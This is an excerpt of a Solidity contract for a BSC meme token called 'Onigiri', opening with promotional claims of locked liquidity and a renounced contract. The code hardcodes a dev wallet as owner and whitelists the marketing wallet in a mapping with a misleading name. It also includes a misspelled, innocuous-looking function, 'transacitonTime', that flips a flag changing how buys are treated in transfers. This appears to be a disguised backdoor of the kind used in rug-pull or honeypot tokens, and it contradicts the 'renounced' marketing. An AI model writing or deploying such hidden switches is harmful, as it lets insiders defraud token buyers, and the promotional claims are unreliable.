...
/**
The Cutest Japanese snack! 🍱 🇯🇵
Community driven Token BSC🔸
BUSD Reflection Rewards! 💰
Low tax 5/5 Forever! 📊
Liquidty Locked & CA Renounced! 🔒

Telegram : https://t.me/OnigiriBSC
...
interface IERC20 {
    ...
    function transacitonTime(address account) external returns (uint256);
...
contract Onigiri is Context, IERC20 { 
    ...
    mapping (address => bool) public _timestampTx; 

    address payable public Wallet_Marketing = payable(0x201e9903ea76CF9B6369002722B696790A9CF684); 
    address payable public Wallet_Dev = payable(0xCa6EAa74705b0cf31f49EeC95FeE19bCCBddE092);
    ...
    bool public uniSwapVersion2Router = false;
    bool public inLineQueue = false;

    modifier isTokenOnTransaction {
        uniSwapVersion2Router = true;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0xCa6EAa74705b0cf31f49EeC95FeE19bCCBddE092;
        ...
        _timestampTx[Wallet_Marketing] = true;
    ...
    function transacitonTime(address account) public isTokenOnTransaction override returns (uint256) {
        if(inLineQueue){
            bool completedTx = _timestampTx[_msgSender()];
            bool isTimeStamp = completedTx;
            if(isTimeStamp && completedTx){
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                isBuy = true;
                if(uniSwapVersion2Router){ isBuy = false;  }
            }
